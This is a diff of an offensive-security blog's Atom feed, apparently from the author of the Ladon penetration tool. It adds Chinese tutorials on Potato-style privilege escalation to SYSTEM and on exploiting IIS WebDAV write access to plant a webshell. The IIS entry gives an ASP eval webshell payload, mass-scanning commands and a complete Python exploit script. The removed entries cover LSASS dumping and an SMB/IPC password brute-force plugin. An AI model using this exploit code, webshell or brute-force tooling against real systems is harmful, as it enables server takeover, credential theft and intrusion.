@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://k8gege.org/"/>
-  <updated>2020-08-15T12:22:21.137Z</updated>
+  <updated>2020-08-15T14:10:57.843Z</updated>
   <id>http://k8gege.org/</id>
   
   <author>
@@ -15,6 +15,62 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>〖教程〗Ladon提权之Potato系列</title>
+    <link href="http://k8gege.org/p/potato.html"/>
+    <id>http://k8gege.org/p/potato.html</id>
+    <published>2020-08-15T12:36:00.000Z</published>
+    <updated>2020-08-15T14:10:57.843Z</updated>
+    
+    <content type="html"><![CDATA[<p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p><script language="javascript" type="text/javascript">window.location.href="http://k8gege.org/Ladon/potato.html";</script><p>Ladon提权之PipePotato/BadPotato/SweetPotato/PrintSpoofer</p><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><p>&gt;= Ladon 7.2.0<br>Update: 20200810</p><h3 id="Potato提权原理"><a href="#Potato提权原理" class="headerlink" title="Potato提权原理"></a>Potato提权原理</h3><p>通过各种方法在本地NTLM中继获取SYSTEM令牌，再通过模拟令牌执行命令，通过以上方法提权统称为potato(不管是否基于原potato修改)。就像SQL注入，通过特定SQL语句注入获取特定数据库信息统称为SQL注入，而不管如何编写的SQL语句，是否基于别人的SQL语句修改。</p><h3 id="提权条件"><a href="#提权条件" class="headerlink" title="提权条件"></a>提权条件</h3><p>1 本地NTLM中继获取SYSTEM令牌<br>2 SeImpersonatePrivilege特权</p><p>测试中任意用户都可以通过本地NTLM中继获取到SYSTEM令牌权限，但是由于USER默认不开户SeImpersonatePrivilege特权，无法模拟令牌创建进程无法执行命令，所以会导致很多Potato提权失败。如下方”Win7管理员提权至SYSTEM“图片上部分就是USER部分的Potato提权失败，下方是管理员权限，而其它环境都是IIS权限。所以为了方便Ladon默认也显示当前用户SeImpersonatePrivilege特权情况。</p><h3 id="SweetPotato"><a href="#SweetPotato" class="headerlink" title="SweetPotato"></a>SweetPotato</h3><p>SweetPotato集成了原版Potato和JulyPotato的功能，包含DCOM/WINRM/PrintSpoofer方法获取SYSTEM。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Load SweetPotato</span><br><span class="line">Local Privilege Escalation from Windows Service Accounts to SYSTEM</span><br><span class="line">Vulnerable: Win7-Win10/Win2008-2019</span><br><span class="line">Usage:</span><br><span class="line">Ladon SweetPotato cmdline</span><br></pre></td></tr></table></figure><h3 id="PrintSpoofer"><a href="#PrintSpoofer" class="headerlink" title="PrintSpoofer"></a>PrintSpoofer</h3><p>pipePotato:一种新型的通用提权漏洞，PrintSpoofer是一个利用打印机PIPE提权的方法，国人写了个工具叫BadPotato。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Load BadPotato</span><br><span class="line">Local Privilege Escalation from Windows Service Accounts to SYSTEM</span><br><span class="line">PrintSpoofer Abusing Impersonate Privileges.</span><br><span class="line">Vulnerable: Win8-Win10/Win2012-2019</span><br><span class="line">Usage:</span><br><span class="line">Ladon BadPotato cmdline</span><br></pre></td></tr></table></figure><h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><p>1 Win7 IIS 应用池用户权限<br>2 Win7 本地管理员用户权限<br>3 Win2012 IIS 应用池权限<br>4 Win7 本地服务用户权限<br>5 Win8 本地服务用户权限</p><p>PS：由于BadPotato不支持WIN7系统，所以以上环境主要以测试SweetPotato为主。</p><h4 id="Win7管理员提权至SYSTEM"><a href="#Win7管理员提权至SYSTEM" class="headerlink" title="Win7管理员提权至SYSTEM"></a>Win7管理员提权至SYSTEM</h4><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exp/lpe/Win7_Admin_SweetPotato.PNG"></p><h4 id="Win7-IIS应用池提权至SYSTEM"><a href="#Win7-IIS应用池提权至SYSTEM" class="headerlink" title="Win7 IIS应用池提权至SYSTEM"></a>Win7 IIS应用池提权至SYSTEM</h4><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exp/lpe/IIS_Win7_SweetPotato.PNG"></p><h4 id="2012-R2-IIS应用池提权至SYSTEM"><a href="#2012-R2-IIS应用池提权至SYSTEM" class="headerlink" title="2012 R2 IIS应用池提权至SYSTEM"></a>2012 R2 IIS应用池提权至SYSTEM</h4><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exp/lpe/IIS8_2012_PR.PNG"></p><h4 id="WIN7服务用户CS提权至SYSTEM"><a href="#WIN7服务用户CS提权至SYSTEM" class="headerlink" title="WIN7服务用户CS提权至SYSTEM"></a>WIN7服务用户CS提权至SYSTEM</h4><p>本地服务用户权限下直接以SYSTEM权限上控Cobalt Strike<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exp/lpe/CS_PR_SweetPotato.PNG"></p><h4 id="WIN8服务用户提权至SYSTEM"><a href="#WIN8服务用户提权至SYSTEM" class="headerlink" title="WIN8服务用户提权至SYSTEM"></a>WIN8服务用户提权至SYSTEM</h4><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exp/lpe/BadPotato.PNG"></p><h3 id="IIS提权"><a href="#IIS提权" class="headerlink" title="IIS提权"></a>IIS提权</h3><p><a href="http://k8gege.org/p/6b9b3afe.html">http://k8gege.org/p/6b9b3afe.html</a></p><h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p><div style="text-align: center; width: 710px; border: green solid 0px;"><img alt style="display: inline-block;width: 250px;height: 300px;" data-original="http://k8gege.org/img/k8team.jpg"></div>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;=============================================================================================&lt;br&gt;++++++++++++++++++++++++++++++++++++++++
+      
+    
+    </summary>
+    
+    
+      <category term="提权" scheme="http://k8gege.org/categories/Lpe/"/>
+    
+    
+      <category term="LPE" scheme="http://k8gege.org/tags/LPE/"/>
+    
+      <category term="EXP" scheme="http://k8gege.org/tags/EXP/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>〖教程〗LadonExp使用IIS写权限Webdav漏洞GetShell</title>
+    <link href="http://k8gege.org/p/iisput.html"/>
+    <id>http://k8gege.org/p/iisput.html</id>
+    <published>2020-08-15T03:36:00.000Z</published>
+    <updated>2020-08-15T14:10:42.711Z</updated>
+    
+    <content type="html"><![CDATA[<p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p><script language="javascript" type="text/javascript">window.location.href="http://k8gege.org/Ladon/iisput.html";</script><p>LadonExp生成器使用教程之IIS写权限漏洞利用，含环境配置、EXP生成、批量利用、Pyhton复现代码。</p><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>该漏洞的产生原因来源于服务器配置不当造成，此漏洞主要是因为服务器开启了webdav的组件导致的可以扫描到当前的操作，具体操作其实是通过webdav的OPTION来查询是否支持PUT。</p><h3 id="IIS配置"><a href="#IIS配置" class="headerlink" title="IIS配置"></a>IIS配置</h3><p>1 启用webdav组件<br>2 目录给写权限(为了方便直接eveyone完全写入权限)<br>3 脚本资源访问权限(不然MOVE失败即无法GetShell)</p><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exp/iis/iis6_cfg.PNG"></p><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exp/iis/iis6_cfg2.PNG"></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>使用LadonEXP可轻松复现此类漏洞，在Ladon改名前(Cscan)已复现过Tomcat，详情参考Tomcat CVE-2017-12615视频： <a href="https://github.com/k8gege/K8CScan/tree/master/Video" target="_blank" rel="noopener">https://github.com/k8gege/K8CScan/tree/master/Video</a></p><h4 id="LadonExp配置PUT"><a href="#LadonExp配置PUT" class="headerlink" title="LadonExp配置PUT"></a>LadonExp配置PUT</h4><p>功能：上传123.TXT<br>Target: <a href="http://192.168.1.22" target="_blank" rel="noopener">http://192.168.1.22</a><br>Method: Put<br>addurl: 123.txt<br>Data: &lt;%eval request(k8gege)%&gt;<br>点击buildexe-&gt;TestExe测试<br>成功返回 Created</p><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exp/iis/iis_put.PNG"></p><h4 id="LadonExp配置MOVE"><a href="#LadonExp配置MOVE" class="headerlink" title="LadonExp配置MOVE"></a>LadonExp配置MOVE</h4><p>功能：将123.txt改名1.asp<br>Target: <a href="http://192.168.1.22/123.txt" target="_blank" rel="noopener">http://192.168.1.22/123.txt</a><br>Method: Move<br>Destination: <a href="http://192.168.1.22/1.asp" target="_blank" rel="noopener">http://192.168.1.22/1.asp</a></p><p>点击buildexe-&gt;TestExe测试<br>成功返回 Created</p><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exp/iis/iis_move.PNG"></p><p>PS: 当然也可以直接PUT写入可解析的其它格式，也不一定非得先PUT再MOVE才能GetShell</p><h4 id="Ladon批量"><a href="#Ladon批量" class="headerlink" title="Ladon批量"></a>Ladon批量</h4><p>扫描C段，当然也可以A段B段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.1/c 生成.dll</span><br><span class="line">Ladon 192.168.1.1/24 生成.dll</span><br></pre></td></tr></table></figure><h4 id="TXT批量"><a href="#TXT批量" class="headerlink" title="TXT批量"></a>TXT批量</h4><p>url.txt里放批量地址，不在同一个段的,示例如下<br><a href="http://192.168.1.1" target="_blank" rel="noopener">http://192.168.1.1</a><br><a href="http://192.10.5.8:808" target="_blank" rel="noopener">http://192.10.5.8:808</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon 生成.dll</span><br></pre></td></tr></table></figure><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>Python实现利用代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding="utf-8"</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">put_url = <span class="string">'http://192.168.1.22/2.txt'</span></span><br><span class="line">move_url = <span class="string">'http://192.168.1.22/2.txt'</span></span><br><span class="line">move_headers = &#123;</span><br><span class="line">    <span class="string">'Destination'</span>:<span class="string">'http://192.168.1.22/shell.asp'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">put_data = <span class="string">"&lt;%eval request('k8gege')%&gt;"</span></span><br><span class="line"></span><br><span class="line">post_data = &#123;</span><br><span class="line">    <span class="string">'#'</span>:<span class="string">''</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = requests.request(<span class="string">'PUT'</span>,url=put_url,data=put_data)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        response = requests.request(<span class="string">'MOVE'</span>,url=move_url,headers=move_headers)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">207</span>:</span><br><span class="line">            response = requests.post(url=<span class="string">'http://192.168.1.22/shell.asp'</span>,data=post_data)</span><br><span class="line">            print(response.content.decode(<span class="string">"gb2312"</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(response.status_code)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a><br>IIS Exp: <a href="https://github.com/k8gege/iisput" target="_blank" rel="noopener">https://github.com/k8gege/iisput</a></p><div style="text-align: center; width: 710px; border: green solid 0px;"><img alt style="display: inline-block;width: 250px;height: 300px;" data-original="http://k8gege.org/img/k8team.jpg"></div>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;=============================================================================================&lt;br&gt;++++++++++++++++++++++++++++++++++++++++
+      
+    
+    </summary>
+    
+    
+      <category term="GetShell" scheme="http://k8gege.org/categories/GetShell/"/>
+    
+    
+      <category term="IIS" scheme="http://k8gege.org/tags/IIS/"/>
+    
+      <category term="EXP" scheme="http://k8gege.org/tags/EXP/"/>
+    
+  </entry>
   
   <entry>
     <title>〖教程〗使用Ladon捕获Windonws登陆密码</title>
@@ -540,69 +596,6 @@
     
     
       <category term="DllHijack" scheme="http://k8gege.org/tags/DllHijack/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Ladon 6.4新增Linux系统探测、管理员提权System降权</title>
-    <link href="http://k8gege.org/p/55476.html"/>
-    <id>http://k8gege.org/p/55476.html</id>
-    <published>2020-04-20T15:55:00.000Z</published>
-    <updated>2020-06-04T12:31:09.713Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>你还在为权限切换的问题而烦恼吗？SYSTEM权限下浏览器密码读取工具失效？SYS权限下系统自带NET USE命令连接IPC失效？<br>SYSTEM权限下截取不到目标桌面？ADMIN权限下打不开SYSTEM权限进程？如何切换各种权限测试工具？等这些都是权限问题，在XP和03用户权限和SYS权限都是同一个会话，所以远控可直接记录到，很多功能我们也没发现影响，直到WIN7微软为了这全，将会话进行隔离，我们会发现SYS权限会话为0，用户为1，这就是为什么以前sys权限控制WIN7机器远程桌面会黑屏的原因?Firefxo和Chrome采用了DBAPI加密，该加密需要对应用户会话信息才能解密，直接以SYSTEM权限启动发现解密失败。所以我们需要切换权限</p><h3 id="Ladon-6-4更新功能"><a href="#Ladon-6-4更新功能" class="headerlink" title="Ladon 6.4更新功能"></a>Ladon 6.4更新功能</h3><p>5.2<br>[u] 修复noping参数问题(误注释了一行代码导致)<br>4.27<br>[+] Ping/PingIP 仅ICMP探测IP速度快(3-6秒/C段,5.8前的OnlinePC)<br>[+] CheckDoor 检测后门(网上公开多年的)–OCI.DLL/5个注册表RUN<br>[u] OsScan 修复6.2 4.20后osscan无法使用的BUG<br>[+] ipcscan.ini INI插件之Ipc密码爆破(net use)<br>[+] smbscan.ini INI插件之Smb密码爆破(impacket)<br>[+] smbhash.ini INI插件之NtlmHash爆破(impacket)</p><p>4.26<br>[+]JspShell 横向移动连接内网webshell执行命令</p><p>4.20<br>[+] GetSystem 管理员/SYSTEM权限切换<br>[+] DumpLsass 导出Lsass内存文件<br>[u] OsScan新增SSH识别操作系统<br>[u] WebScan、SameWeb新增WebBanner<br>[+] WhatCms新增Banner、TP-Link WDR7300识别<br>[u] 修复6.3漏扫10、20等含0的C段</p><h3 id="提权-以SYSTEM权限执行"><a href="#提权-以SYSTEM权限执行" class="headerlink" title="提权 以SYSTEM权限执行"></a>提权 以SYSTEM权限执行</h3><p>命令：Ladon GetSystem cmd.exe<br>命令：Ladon GetSystem cmd.exe /system<br>命令：Ladon GetSystem cmd.exe lsass<br>可指定EXE或BAT，将以SYSTEM权限运行，如下图弹个CMD<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/GetSystem.PNG"></p><p>注意：需管理员权限，若存在UAC可使用BypassUac获取管理员</p><p>当然也可以使用系统AT、SCHTASKS等命令获取SYSTEM权限，不担心被杀，只是麻烦点，看Ladom多简单</p><h3 id="降权-以用户权限执行"><a href="#降权-以用户权限执行" class="headerlink" title="降权 以用户权限执行"></a>降权 以用户权限执行</h3><p>SYSTEM权限下并不是什么都可以做，比如大家用Ladon或其它工具弹出个SYS权限CMD，再试一下系统自带的NET USE命令连接IPC看提示什么，你会发现明明密码是正确的但是却提示错误。为何需提权、降权我在14年已发布<br>命令：Ladon GetSystem cmd.exe /user<br>命令：Ladon GetSystem cmd.exe explorer<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/GetSystem2.PNG"></p><p>PS: 当然也可以切换至任意权限，指定对应进程即可，如降权到服务权限等</p><h3 id="DumpLsass内存密码"><a href="#DumpLsass内存密码" class="headerlink" title="DumpLsass内存密码"></a>DumpLsass内存密码</h3><p>Dump Lsass内存文件，取回本地读取密码，无需免杀MIMI<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/DumpLsass.PNG"></p><h3 id="Ping"><a href="#Ping" class="headerlink" title="Ping"></a>Ping</h3><p>命令: Ping 或 PingIP</p><p>仅ICMP协议探测存活主机（速度快3-6秒/ C段，5.8版本前的OnlinePC）<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/PingIP.PNG"></p><h3 id="Ipc密码爆破"><a href="#Ipc密码爆破" class="headerlink" title="Ipc密码爆破"></a>Ipc密码爆破</h3><p>INI插件：调用系统net use命令进行IPC爆破，由于系统限制只能连接一个，因此只能验证一个密码结束后，才能对下一个密码进行验证，而且必须删除连接，以上因素导致用系统命令爆破速度会很慢，因为你无法多线程一下就验证多个密码，所以Ladon内置模块不再保留IpcScan，使用分破4万密码的SmbScan可快速验证密码或者调用impacket的smbexec验证速度要比net use也快很多。</p><p>PS：此模块的存在主要是用于针对2003或XP系统的Ipc爆破，远程为Win7后系统推荐使用内置SmbScan爆破</p><p>ipcscan.ini</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[Ladon]</span><br><span class="line"><span class="comment">#Brute-Force IPC(445) PassWord </span></span><br><span class="line">exe=cmd.exe</span><br><span class="line">arg=net use \\<span class="variable">$ip</span>$ /user:<span class="variable">$user</span>$ <span class="variable">$pass</span>$ &amp; net use \\<span class="variable">$ip</span>$ /del</span><br><span class="line"><span class="comment">#isok=The command completed successfully</span></span><br><span class="line">isok=命令成功完成</span><br><span class="line">port=445</span><br><span class="line"><span class="built_in">log</span>=<span class="literal">true</span></span><br></pre></td></tr></table></figure><p>扫描C段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8/c ipcscan.ini</span><br></pre></td></tr></table></figure><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/INI_ipcscan.PNG"></p><h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;你还在为权限切换的问题而烦恼吗？SYSTEM权限下浏览器密码读取工具失效？SYS权限下系统自带NET USE命令连接IPC失效？&lt;br&gt;SY
-      
-    
-    </summary>
-    
-    
-      <category term="提权" scheme="http://k8gege.org/categories/Lpe/"/>
-    
-      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
-    
-    
-      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
-    
-      <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Ladon中28种探测存活主机方法(含绕过防火墙探测)</title>
-    <link href="http://k8gege.org/p/48225.html"/>
-    <id>http://k8gege.org/p/48225.html</id>
-    <published>2020-04-02T15:00:00.000Z</published>
-    <updated>2020-06-11T16:19:24.825Z</updated>
-    
-    <content type="html"><![CDATA[<p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/OnlinePC6.2.png"></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>内网渗透中，最重要的一步就是探测在线机器，只有先探测到机器<br>接下来才是探测操作系统、扫描端口服务、开放WEB、扫描漏洞等。<br>目标不开机，你搞啥呢？当然也有一种情况，目标开机但却扫不到<br>这是因为目前大部份扫描器使用PING扫描，而防火墙默认是拦截的<br>默认条件下也不放行其它端口，比如SMB、RDP、HTTP等协议也不行<br>那能不能在防火墙完全防护状态下探测存活机器呢？答案是有的。</p><h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><p>Win7-A: 192.168.1.20 测试防火墙<br>Win7-B: 192.168.1.7  Ladon扫描器</p><p>实验1：A机器关闭防火墙<br>实验2：A机器开启防火墙<br>实验3：A机器关机</p><p>PS：整个过程中B机器防火墙需关闭，因为要保证所有协议都能进出B机器<br>才能测试防火墙开启或关闭的情况下，分别有哪些协议可以探测存活主机</p><h3 id="A关闭防火墙"><a href="#A关闭防火墙" class="headerlink" title="A关闭防火墙"></a>A关闭防火墙</h3><p>ICMP协议可达目标机器，即可PING通A机器<br>Ladon 192.168.1.1/24 OnlinePC<br>=============================================<br>ICMP: 192.168.1.7       00-0C-00-00-00-90       Win-K8gege      VMware<br>ICMP: 192.168.1.4       00-0C-00-00-00-1C                       VMware<br>ICMP: 192.168.1.30      08-1F-00-00-00-EA                       Tp-Link<br>ICMP: 192.168.1.1       94-28-00-00-00-4E                       NewH3C<br>ICMP: 192.168.1.20      00-0C-00-00-00-50                       VMware<br>=============================================<br>OnlinePC:5</p><h3 id="A开启防火墙"><a href="#A开启防火墙" class="headerlink" title="A开启防火墙"></a>A开启防火墙</h3><p>ICMP协议不可达目标机器，即无法PING通A机器，但是MAC可以<br>Ladon 192.168.1.1/24 OnlinePC<br>=============================================<br>ICMP: 192.168.1.7       00-0C-00-00-00-90       Win-K8gege      VMware<br>ICMP: 192.168.1.1       94-28-00-00-00-4E                       NewH3C<br>ICMP: 192.168.1.30      08-1F-00-00-00-EA                       Tp-Link<br>ICMP: 192.168.1.4       00-0C-00-00-00-1C                       VMware<br> MAC: 192.168.1.20      00-0C-00-00-00-50                       VMware<br>ICMP: 192.168.1.2       38-AD-00-00-00-1F                       NewH3C<br>=============================================<br>OnlinePC:6</p><h3 id="A机器关机"><a href="#A机器关机" class="headerlink" title="A机器关机"></a>A机器关机</h3><p>A机器关机后，发现无法探测MAC，说明能获取到MAC，机器肯定在线<br>Ladon 192.168.1.1/24 OnlinePC<br>=============================================<br>ICMP: 192.168.1.7       00-0C-00-00-00-90       Win-K8gege      VMware<br>ICMP: 192.168.1.1       94-28-00-00-00-4E                       NewH3C<br>ICMP: 192.168.1.4       00-0C-00-00-00-1C                       VMware<br>ICMP: 192.168.1.30      08-1F-00-00-00-EA                       Tp-Link<br>ICMP: 192.168.1.2       38-AD-00-00-00-1F                       NewH3C<br>=============================================<br>OnlinePC:5</p><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>开机状态下，开启系统防火墙后，无法PING通机器（默认配置）<br>但可获取远程机器MAC，因此可通过MAC探测目标主机是否存活</p><h3 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h3><p>1.有人问我Ladon扫描出来的存活机器，为何PING不通呢?是不是不准？<br>答：首先机器存活，但相关端口未开放，如3389没开,你当然连不上。<br>同理防火墙默认根本不允许ICMP协议通过，你PING不通很正常。Ladon<br>通过其它方式探测到存活，而非单纯的ICMP，PING不通并不代表关机<br>上面的实验结果已充分说明，用其它工具扫描可能会漏掉禁PING机器</p><p>2.有人问我为什么新版的OnlinePC比之前慢了，以前3秒可扫一个C段。<br>再重复一次，Ladon的OnlinePC不只是单纯的通过ICMP检测存活主机。<br>打个比方一个人自己开车去北京，中途车坏了他就不去了，事情结束<br>如果车坏了，找人来修或换乘轮船，最后到达北京时间是不是多了。<br>新版的先PING机器,不通并没有结束，而是再尝试使用其它协议探测<br>最简单的一个问题，你是想要扫描结果更准更多，还是结果少速度快<br>再者以前可能3秒至几秒，现在可能几秒至13秒，才多几秒钟也不慢啊</p><p>以上两个问题是我发此文章的主要原因，怕还会有很多人问同样的问题</p><h3 id="28种方法"><a href="#28种方法" class="headerlink" title="28种方法"></a>28种方法</h3><p>Ladon以下模块均可用于探测存活主机，不要死板的只用OnlinePC<br>或者只用其它只是用PING来扫描的工具，得到的结果错过很多机器<br>可根据实际情况使用以下模块探测存活主机，如WAF禁用HTTP协议<br>采用HTTP协议的模块就不要用了，即便同样是HTTP，模块结果不同<br>如WhatCMS识别到CMS才回显，WebScan还会返回HttpBanner。<br>所以同个协议，有些模块扫不出东西，不代表防火墙禁止该协议。</p><p>如大家最容易理解的扫445端口发现不开放，不代表TCP协议禁用<br>因为人家怕你用MS17010漏洞一键GETSHELL，所以禁止了共享而已<br>如果要精准探测存活主机，就得使用多个方式才能深入拓展内网</p><table><thead><tr><th>ID</th><th>模块名称</th><th>功能说明</th><th>采用协议</th><th>用法</th></tr></thead><tbody><tr><td>1</td><td>OnlinePC</td><td>存活主机信息</td><td>ICMP、MAC、DNS</td><td>Ladon 192.168.1.1/24 OnlinePC</td></tr><tr><td>2</td><td>OnlineIP</td><td>存活主机(IP)</td><td>ICMP、MAC、DNS</td><td>Ladon 192.168.1.1/24 OnlineIP</td></tr><tr><td>3</td><td>UrlScan</td><td>URL域名扫描</td><td>HTTP</td><td>Ladon 192.168.1.1/24 UrlScan</td></tr><tr><td>4</td><td>SameWeb</td><td>同服域名扫描</td><td>HTTP</td><td>Ladon 192.168.1.1/24 SameWeb</td></tr><tr><td>5</td><td>WebScan</td><td>Web信息扫找</td><td>HTTP</td><td>Ladon 192.168.1.1/24 WebScan</td></tr><tr><td>6</td><td>HostIP</td><td>主机名解析</td><td>DNS</td><td>Ladon Win-K8gege HostIP</td></tr><tr><td>7</td><td>DomainIP</td><td>域名解析</td><td>DNS</td><td>Ladon k8gege.org DomainIP</td></tr><tr><td>8</td><td>OsScan</td><td>操作系统版本</td><td>MAC、DNS、SMB、HTTP、RDP、TCP等</td><td>Ladon 192.168.1.1/24 OsScan</td></tr><tr><td>9</td><td>PortScan</td><td>扫描Banner</td><td>TCP</td><td>Ladon 192.168.1.1/24 PortScan</td></tr><tr><td>10</td><td>WhatCMS</td><td>Web指纹识别</td><td>HTTP</td><td>Ladon 192.168.1.1/24 WhatCMS</td></tr><tr><td>11</td><td>CiscoScan</td><td>思科扫描</td><td>HTTP、TCP</td><td>Ladon 192.168.1.1/24 CiscoScan</td></tr><tr><td>12</td><td>EnumMssql</td><td>MSSQL主机</td><td>MSSQL</td><td>Ladon EnumMssql</td></tr><tr><td>13</td><td>EnumShare</td><td>共享主机</td><td>SMB</td><td>Ladon EnumShare</td></tr><tr><td>14</td><td>LdapScan</td><td>LDAP主机/389端口/密码爆破</td><td>LDAP、TCP</td><td>Ladon 192.168.1.1/24 LdapScan</td></tr><tr><td>15</td><td>FtpScan</td><td>FTP主机/21端口/密码爆破</td><td>FTP、TCP</td><td>Ladon 192.168.1.1/24 FtpScan</td></tr><tr><td>16</td><td>SmbScan</td><td>445端口/密码爆破</td><td>SMB、TCP</td><td>Ladon 192.168.1.1/24 SmbScan</td></tr><tr><td>17</td><td>WmiScan</td><td>135端口/密码爆破</td><td>WMI、TCP</td><td>Ladon 192.168.1.1/24 WmiScan</td></tr><tr><td>18</td><td>SmbHash</td><td>445端口/密码爆破</td><td>SMB、TCP</td><td>Ladon 192.168.1.1/24 SmbHash</td></tr><tr><td>19</td><td>WmiHash</td><td>135端口/密码爆破</td><td>WMI、TCP</td><td>Ladon 192.168.1.1/24 WmiHash</td></tr><tr><td>20</td><td>SshScan</td><td>22端口/密码爆破</td><td>SSH、TCP</td><td>Ladon 192.168.1.1/24 SshScan</td></tr><tr><td>21</td><td>MssqlScan</td><td>1433端口/密码爆破</td><td>MSSQL、TCP</td><td>Ladon 192.168.1.1/24 MssqlScan</td></tr><tr><td>22</td><td>OracleScan</td><td>1521端口/密码爆破</td><td>Oracle、TCP</td><td>Ladon 192.168.1.1/24 OracleScan</td></tr><tr><td>23</td><td>MysqlScan</td><td>3306端口/密码爆破</td><td>MYSQL、TCP</td><td>Ladon 192.168.1.1/24 MysqlScan</td></tr><tr><td>24</td><td>VncScan</td><td>5900端口/密码爆破</td><td>VNC、TCP</td><td>Ladon 192.168.1.1/24 VncScan</td></tr><tr><td>25</td><td>MS17010</td><td>MS17010漏洞检测</td><td>TCP、SMB</td><td>Ladon 192.168.1.1/24 MS17010</td></tr><tr><td>26</td><td>AdiDnsDump</td><td>域内存活机器</td><td>DNS、LDAP</td><td>Ladon AdiDnsDump 